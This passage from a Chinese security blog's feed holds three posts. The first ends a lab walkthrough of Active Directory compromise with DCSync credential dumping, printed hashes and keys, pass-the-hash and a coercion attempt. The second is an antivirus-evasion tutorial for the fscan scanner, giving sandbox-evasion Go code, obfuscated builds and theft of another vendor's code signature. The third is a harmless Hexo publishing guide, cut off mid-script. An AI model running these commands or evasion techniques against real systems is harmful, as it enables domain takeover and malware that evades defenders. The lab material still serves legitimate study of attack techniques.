/usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: dc$@cyberstrikelab.com</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:88  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;dc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;dc$&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:88  ...  OK</span><br><span class="line">[*] Got hash for &#x27;dc$@cyberstrikelab.com&#x27;: aad3b435b51404eeaad3b435b51404ee:d1ed4102e40bc473c02156fd10f008ae</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>接下来 用机器用户的hash进行DCSync获取域管的hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py cyberstrikelab.com/dc$@10.6.6.55 -hashes aad3b435b51404eeaad3b435b51404ee:d1ed4102e40bc473c02156fd10f008ae</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">proxychains4 impacket-secretsdump cyberstrikelab.com/dc\$@10.6.6.55 -hashes aad3b435b51404eeaad3b435b51404ee:d1ed4102e40bc473c02156fd10f008ae</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples&gt;python secretsdump.py cyberstrikelab.com/dc$@10.6.6.55 -hashes aad3b435b51404eeaad3b435b51404ee:d1ed4102e40bc473c02156fd10f008ae</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:28cfbc91020438f2a064a63fff9871fa:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:416f4ea64c9c73ad29a4a69dcee5d8ca:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">cyberstrikelab.com\cslab:1104:aad3b435b51404eeaad3b435b51404ee:39b0e84f13872f51efb3b8ba5018c517:::</span><br><span class="line">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1ed4102e40bc473c02156fd10f008ae:::</span><br><span class="line">CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:331dcbb88d1a4847c97eab7c1c168ac8:::</span><br><span class="line">hub$:1105:aad3b435b51404eeaad3b435b51404ee:425be14f48c91891c632fcb423d96677:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:8583c13a9eca67e085ff0b68af74316bef0ebd3fb197bb235b76cbb72358f2ef</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:6012285d474e3b60086965219ac7e31c</span><br><span class="line">Administrator:des-cbc-md5:208fc8f42fae3132</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:0b820697b640266ced6843c4041131c1e3750000e00d47c0c597a82547927337</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:c8f683e4cf2033fd75416667670e13bb</span><br><span class="line">krbtgt:des-cbc-md5:23dc674a76bf7adc</span><br><span class="line">cyberstrikelab.com\cslab:aes256-cts-hmac-sha1-96:34439b0bf9f6e1bf57d4d859215ed387a9c75e944ac053ddd1bc2f1e5b162048</span><br><span class="line">cyberstrikelab.com\cslab:aes128-cts-hmac-sha1-96:84a132b5db39e2e652c08b8148fecb00</span><br><span class="line">cyberstrikelab.com\cslab:des-cbc-md5:46f457ef2aad0e08</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:020a0f314a1635101d5251bf713b08c65679dc886f7c2fc2d2274ae8c33c46b3</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:5cc472eacb83037eda8997e293306a83</span><br><span class="line">DC$:des-cbc-md5:d57aef07ce80073e</span><br><span class="line">CYBERWEB$:aes256-cts-hmac-sha1-96:c6e9eb6e232ffd2ff68c00d395857e6755813182e361efa4b712b9a9fc2b19ff</span><br><span class="line">CYBERWEB$:aes128-cts-hmac-sha1-96:b19d111ada0db2ea3020447ed4df7151</span><br><span class="line">CYBERWEB$:des-cbc-md5:9249dae9e60d4a38</span><br><span class="line">hub$:aes256-cts-hmac-sha1-96:216bcf9977492c4aa8a8d9938a70b4123df42e3f2abf69aec6902859ee6aa912</span><br><span class="line">hub$:aes128-cts-hmac-sha1-96:45bc9f906966bf97cb96d7e630c10127</span><br><span class="line">hub$:des-cbc-md5:f851136ec7855b23</span><br><span class="line">[*] Cleaning up...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后PTH提到域控就OK了</p><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p><img src="/img/cyberstrikelab-lab9/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python D:\red\内网\免杀工具包\免杀工具包\impacket-0.12.0\examples\wmiexec.py cyberstrikelab.com/administrator@10.6.6.55  -hashes 00000000000000000000000000000000:28cfbc91020438f2a064a63fff9871fa -codec gbk</span><br></pre></td></tr></table></figure><p><img src="/img/cyberstrikelab-lab9/17.png"></p><h1 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h1><p>指纹识别后打SQL注入获取后台账密——》后台任意文件上传getshell——》SMB爆破密码横向第一台机子——》sweetpotato提权system——》与域内通讯通过ADCS与DCSync获取域管hash——》PTH拿下域控</p><h2 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h2><p>前面扫出来</p><blockquote><p><font style="color:rgb(102, 102, 102);">ESC8 是指注册服务已安装并通过 HTTP 启用 Web 注册，从而可以利用NTLM中继。这个实战环境好像挺难，因为需要目标向监听服务器发起请求，内网基本不出网，不知道大佬操作了，估计别的大哥有别的方式。</font></p></blockquote><p><font style="color:rgb(102, 102, 102);">这个有两种打法，一个就是上面的web注册（</font><a href="https://xz.aliyun.com/news/13175">https://xz.aliyun.com/news/13175</a><font style="color:rgb(102, 102, 102);">）这篇文章有写</font></p><p><font style="color:rgb(102, 102, 102);">用打印机提权强制触发回连（也没成功）</font></p><p><font style="color:rgb(102, 102, 102);"></font></p><p><font style="color:rgb(102, 102, 102);"></font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python Coercer.py coerce -l 172.16.233.2 -t 10.6.6.55 -u &#x27;hub$&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -d cyberstrikelab.com -v</span><br></pre></td></tr></table></figure><p>发现需要机子出网，那利用条件太苛刻了，打不成功，最终应该是ESC1和提权那个可以利用</p><p><img src="/img/cyberstrikelab-lab9/18.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/red/Coercer-2.4.3]</span><br><span class="line">└─# proxychains4 python Coercer.py coerce -l 172.16.233.2 -t 10.6.6.55 -u &#x27;hub$&#x27; -p &#x27;zgO22XEpVfG6Mr8m&#x27; -d cyberstrikelab.com -v</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">       ______</span><br><span class="line">      / ____/___  ___  _____________  _____</span><br><span class="line">     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/</span><br><span class="line">    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3</span><br><span class="line">    \____/\____/\___/_/   \___/\___/_/       by @podalirius_</span><br><span class="line"></span><br><span class="line">[info] Starting coerce mode</span><br><span class="line">[info] Scanning target 10.6.6.55</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:135  ...  OK</span><br><span class="line">[*] DCERPC portmapper discovered ports: 49664,49665,49666,49668,49701,49670,49671,49676,49710,49680,49714</span><br><span class="line">[+] Coercing &#x27;10.6.6.55&#x27; to authenticate to &#x27;172.16.233.2&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:49671  ...  OK</span><br><span class="line">[+] DCERPC port &#x27;49671&#x27; is accessible!</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:49671  ...  OK</span><br><span class="line">   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:49671  ...  OK</span><br><span class="line">      [&gt;] (-testing-) MS-RPRN──&gt;RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine=&#x27;\\172.16      [!] (NO_AUTH_RECEIVED) MS-RPRN──&gt;RpcRemoteFindFirstPrinterChangeNotification(pszLocalMachine=&#x27;\\172.16.233.2\x00&#x27;) </span><br><span class="line">Continue (C) | Skip this function (S) | Stop exploitation (X) ? c</span><br><span class="line">[proxychains] Strict chain  ...  192.168.72.1:1123  ...  10.6.6.55:49671  ...  OK</span><br><span class="line">      [&gt;] (-testing-) MS-RPRN──&gt;RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine=&#x27;\\172.      [!] (NO_AUTH_RECEIVED) MS-RPRN──&gt;RpcRemoteFindFirstPrinterChangeNotificationEx(pszLocalMachine=&#x27;\\172.16.233.2\x00&#x27;) </span><br><span class="line">Continue (C) | Skip this function (S) | Stop exploitation (X) ? C</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fscan免杀（脚本小子版）</title>
      <link href="/post/59f11f31.html"/>
      <url>/post/59f11f31.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接</p><p><a href="https://www.freebuf.com/articles/web/429244.html">https://www.freebuf.com/articles/web/429244.html</a></p></blockquote><p>360不能用upx，加白就可以绕</p><p>火绒加白可以绕，还可以用upx</p><p>静态就是将fscan全部替换了，这里我就不再多说了</p><p>根据代码分析，这个程序采用了多种技术来绕过沙箱检测：</p><h2 id="1-文件名校验"><a href="#1-文件名校验" class="headerlink" title="1. 文件名校验"></a>1. 文件名校验</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> filepath.Base(os.Args[<span class="number">0</span>]) != <span class="string">&quot;can.exe&quot;</span> &#123;</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>检查可执行文件名是否为 <a href="file://C:\Users\17413\Desktop\fscan\fscan\can.exe">can.exe</a></li><li>如果不是则直接退出，防止在沙箱中以不同名称运行时被分析</li></ul><h2 id="2-运行时间检测"><a href="#2-运行时间检测" class="headerlink" title="2. 运行时间检测"></a>2. 运行时间检测</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checktime</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> kernel = syscall.NewLazyDLL(<span class="string">&quot;Kernel32.dll&quot;</span>)</span><br><span class="line">    GetTickCount := kernel.NewProc(<span class="string">&quot;GetTickCount&quot;</span>)</span><br><span class="line">    r, _, _ := GetTickCount.Call()</span><br><span class="line">    ms := time.Duration(r * <span class="number">1000</span> * <span class="number">1000</span>)</span><br><span class="line">    tm := time.Duration(<span class="number">30</span> * time.Minute)</span><br><span class="line">    <span class="keyword">if</span> ms &lt; tm &#123;</span><br><span class="line">        os.Exit(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用 Windows API <code>GetTickCount</code> 获取系统运行时间</li><li>要求系统运行时间超过30分钟才继续执行</li><li>沙箱环境通常运行时间较短，此检查可有效规避自动分析</li></ul><h2 id="3-延迟执行"><a href="#3-延迟执行" class="headerlink" title="3. 延迟执行"></a>3. 延迟执行</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rand.Seed(time.Now().UnixNano())</span><br><span class="line">sleeptime := rand.Intn(<span class="number">8</span>)</span><br><span class="line">time.Sleep(time.Duration(sleeptime) * time.Second)</span><br></pre></td></tr></table></figure><ul><li>随机延迟0-7秒执行，干扰沙箱的定时分析机制</li><li>增加分析时间成本，降低自动化检测效率</li></ul><h2 id="4-参数验证机制"><a href="#4-参数验证机制" class="headerlink" title="4. 参数验证机制"></a>4. 参数验证机制</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) &lt; <span class="number">3</span> || os.Args[<span class="number">1</span>] != <span class="string">&quot;confirm&quot;</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;[+] 请以 confirm 模式启动程序: xxx.exe confirm 666&quot;</span>)</span><br><span class="line">    os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>要求特定启动参数格式，防止沙箱直接运行分析</li><li>增加了分析的复杂度</li></ul><p>这些技术组合使用，能够有效规避大多数基础沙箱的自动分析。</p><h2 id="二开生成html"><a href="#二开生成html" class="headerlink" title="二开生成html"></a>二开生成html</h2><p>将扫描结果传递给模板并生成HTML</p><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">garble -literals -tiny build -o payload.exe main.<span class="keyword">go</span></span><br></pre></td></tr></table></figure><h2 id="加白"><a href="#加白" class="headerlink" title="加白"></a>加白</h2><p><img src="/img/fscan%E5%85%8D%E6%9D%80%EF%BC%88%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88%EF%BC%89/1.png"></p><p>Sign-Sacker-2.0.exe</p><p><img src="/img/fscan%E5%85%8D%E6%9D%80%EF%BC%88%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88%EF%BC%89/2.png"></p><p><font style="color:rgb(77, 77, 77);">一般程序被执行得时候，杀软都会检测是否存在</font><font style="color:rgb(77, 77, 77);">数字签名</font><font style="color:rgb(77, 77, 77);">，所以很有必要再加一层数字签名</font></p><p><font style="color:rgb(77, 77, 77);">我这里选择了一款一直在用的签名劫持</font><font style="color:rgb(77, 77, 77);">软件</font></p><blockquote><p><font style="color:rgb(79, 79, 79);background-color:rgb(238, 240, 244);"><a href="https://github.com/langsasec/Sign-Sacker">https://github.com/langsasec/Sign-Sacker</a></font></p></blockquote><p><img src="/img/fscan%E5%85%8D%E6%9D%80%EF%BC%88%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88%EF%BC%89/3.png"></p><p><font style="color:rgb(77, 77, 77);">这里我们掠夺超级无敌的QQ签名,嘻嘻!</font></p><p><img src="/img/fscan%E5%85%8D%E6%9D%80%EF%BC%88%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88%EF%BC%89/4.png"></p><p><img src="/img/fscan%E5%85%8D%E6%9D%80%EF%BC%88%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88%EF%BC%89/5.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀对抗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客</title>
      <link href="/post/4f72e00a.html"/>
      <url>/post/4f72e00a.html</url>
      
        <content type="html"><![CDATA[<p>#官方文档</p><p><a href="https://hexo.io/zh-cn/docs/one-command-deployment">https://hexo.io/zh-cn/docs/one-command-deployment</a></p><p>#安装教程，还可以上b站看别人的视频教学</p><p><a href="https://blog.csdn.net/wushibo123/article/details/124619123">https://blog.csdn.net/wushibo123/article/details/124619123</a></p><p>hexo c &#x3D;&#x3D; hexo clean      # 清除缓存  </p><p>hexo g &#x3D;&#x3D; hexo generate   # 生成静态文件</p><p>hexo d &#x3D;&#x3D; hexo deploy     # 部署到github中，更新网页端的内容</p><p>hexo s &#x3D;&#x3D; hexo server     # 通过启动本地服务器，预览文章效果</p><p>hexo n &#x3D;&#x3D; hexo new       </p><p>更新</p><p>图片放该目录</p><p><img src="/img/hexo%E5%8D%9A%E5%AE%A2/1.png"></p><p>文章放该目录</p><p><img src="/img/hexo%E5%8D%9A%E5%AE%A2/2.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>将语雀的文章快速部署到自己的博客上，先下载md，使用以下脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def download_image(url, save_path):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout=<span class="number">10</span>)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line">        with open(save_path, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line">        print(f<span class="string">&quot;下载成功：&#123;url&#125; -&gt; &#123;save_path&#125;&quot;</span>)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f<span class="string">&quot;下载失败：&#123;url&#125;，错误：&#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ensure_front_matter(content, base_name):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    如果原始内容没有 YAML front matter，则添加默认的 front matter。</span></span><br><span class="line"><span class="string">    默认 front matter 包括 title 和当前日期，您可以根据需要修改。</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    stripped = content.lstrip()</span><br><span class="line">    <span class="keyword">if</span> stripped.startswith(<span class="string">&#x27;---&#x27;</span>):</span><br><span class="line">        <span class="comment"># 已有 front matter，不做修改</span></span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        now = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        front_matter = f<span class="string">&quot;---\ntitle: &#123;base_name&#125;\ndate: &#123;now&#125;\n---\n\n&quot;</span></span><br><span class="line">        <span class="keyword">return</span> front_matter + content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_md_file(md_file, hexo_img_folder):</span><br><span class="line">    <span class="comment"># 提取 Markdown 文件名（不含扩展名），用于图片文件夹名称和 front matter 标题</span></span><br><span class="line">    base_name = os.path.splitext(os.path.basename(md_file))[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 图片存放在 hexo_img_folder 下，如：source/img/&lt;base_name&gt;</span></span><br><span class="line">    img_folder = os.path.join(hexo_img_folder, base_name)</span><br><span class="line">    os.makedirs(img_folder, exist_ok=True)</span><br><span class="line"></span><br><span class="line">    with open(md_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) as f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保证内容含有 Hexo 所需的 YAML front matter</span></span><br><span class="line">    content = ensure_front_matter(content, base_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 匹配 Markdown 中的图片语法：![描述](图片链接)</span></span><br><span class="line">    pattern = <span class="built_in">r</span><span class="string">&#x27;!\[(.*?)\]\((.*?)\)&#x27;</span></span><br><span class="line">    matches = re.findall(pattern, content)</span><br><span class="line">    print(f<span class="string">&quot;在文件 &#123;md_file&#125; 中找到 &#123;len(matches)&#125; 张图片。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    counter = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> alt_text, url <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="comment"># 只处理 HTTP 链接的图片</span></span><br><span class="line">        <span class="keyword">if</span> not url.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            print(f<span class="string">&quot;非HTTP链接，跳过下载：&#123;url&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取图片扩展名，如果无法提取则默认 .jpg</span></span><br><span class="line">        original_name = os.path.basename(url).split(<span class="string">&#x27;?&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        _, ext = os.path.splitext(original_name)</span><br><span class="line">        <span class="keyword">if</span> not ext:</span><br><span class="line">            ext = <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按顺序命名图片：1.jpg, 2.png, 等</span></span><br><span class="line">        new_file_name = f<span class="string">&quot;&#123;counter&#125;&#123;ext&#125;&quot;</span></span><br><span class="line">        local_path = os.path.join(img_folder, new_file_name)</span><br><span class="line"></span><br><span class="line">        download_image(url, local_path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 修改图片链接为 Hexo 部署后静态资源的绝对路径</span></span><br><span class="line">        new_link = f<span class="string">&quot;/img/&#123;base_name&#125;/&#123;new_file_name&#125;&quot;</span></span><br><span class="line">        new_image_md = f<span class="string">&quot;![&#123;alt_text&#125;](&#123;new_link&#125;)&quot;</span></span><br><span class="line">        <span class="comment"># 替换 Markdown 文件中的图片链接</span></span><br><span class="line">        content = content.replace(f<span class="string">&quot;![&#123;alt_text&#125;](&#123;url&#125;)&quot;</span>, new_image_md)</span><br><span class="line"></span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成新的 Markdown 文件，文件名加上 _local 后缀，存放于原文件所在目录</span></span><br><span class="line">    new_md_file = os.path.splitext(md_file)[<span class="number">0</span>] + <span class="string">&#x27;_local.md&#x27;</span></span><br><span class="line">    with open(new_md_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) as f:</span><br><span class="line">        f.write(content)</span><br><span class="line">    print(f<span class="string">&quot;生成本地化 Markdown 文件：&#123;new_md_file&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;处理 Markdown 文件，下载其中的图片到 Hexo 博客指定目录，并更新图片链接。&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--input&quot;</span>,</span><br><span class="line">        help=<span class="string">&quot;输入的 Markdown 文件或包含 Markdown 文件的目录（默认：当前目录）&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>,</span><br><span class="line">        help=<span class="string">&quot;Hexo 博客中存放图片的目录（默认：source/img）&quot;</span>,</span><br><span class="line">        default=os.path.join(<span class="string">&quot;source&quot;</span>, <span class="string">&quot;img&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    input_path = args.input</span><br><span class="line">    <span class="comment"># 如果输入的是单个文件，则只处理这个文件；否则处理目录下所有 .md 文件</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(input_path):</span><br><span class="line">        md_files = [<span class="type">input_path</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        md_files = [<span class="type">os.path.join</span>(<span class="type">input_path</span>, <span class="type">f</span>) <span class="type">for</span> <span class="type">f</span> <span 